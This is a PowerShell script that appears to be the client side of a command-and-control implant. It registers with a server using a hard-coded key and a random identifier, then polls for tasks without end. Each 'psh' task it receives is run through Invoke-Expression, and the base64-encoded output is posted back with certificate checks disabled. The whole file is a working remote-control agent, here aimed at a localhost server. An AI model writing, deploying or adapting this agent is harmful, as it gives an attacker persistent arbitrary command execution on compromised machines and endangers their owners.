$secret_key = "RkRrcitEQ25oLDJjPWBqPShqTyc6S1U3bEVDNGI5MmFxQ1k7TDNJZENmYl0="
$identifier = Get-Random -Max 100000000000000000
$base_url = "https://127.0.0.1:8587/"
$sleep_time = 1



$headers =@{
    "X-Auth"=$secret_key
    "Identifier"=$identifier
    "Content-Type" = "application/json"
}

while ($true) {
    Start-Sleep -second $sleep_time
    $command_url ="{0}command" -f $base_url
    $output = Invoke-RestMethod -Uri $command_url -Headers $headers -SkipCertificateCheck
    if ("$output" -eq "registration_error") {
        $uri = "{0}checkin" -f $base_url
        Invoke-RestMethod -Uri $uri -Headers $headers -SkipCertificateCheck > $null 
    }else{
        if ($output -ne "" -And $output -ne $null){
            $url = "{0}output" -f $base_url
            $stdout = ""
            $stderr = ""
            Write-Host $output
            $method = $output.method
            $task_id = $output.task_id
            $arguments = $output.arguments
            Write-Host "$method,$task_id,$arguments"
            try {
                if ($method -eq "psh"){
                    $command_output = Invoke-Expression "$arguments"
                    $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command_output))
                    $data_table = @{
                        task_id=$task_id
                        output=$base64_output
                    } | ConvertTo-Json
                    Invoke-RestMethod -Uri $url -Method Post -Body $data_table -Headers $headers -SkipCertificateCheck > $null 
                }else{
                    $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Method not supported"))
                    $data_table = @{
                        task_id=$task_id
                        output=$base64_output
                    } | ConvertTo-Json
                    Invoke-RestMethod -Uri $url -Method Post -Body $data_table -Headers $headers -SkipCertificateCheck > $null 
                }
            }catch{
                $error_details = "$_.ErrorDetails.Message.message"
                $base64_output = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($error_details))
                $data_table = @{
                    task_id=$task_id
                    output=$base64_output
                } | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Body $data_table -Headers $headers -SkipCertificateCheck > $null
            }

        }
    }

}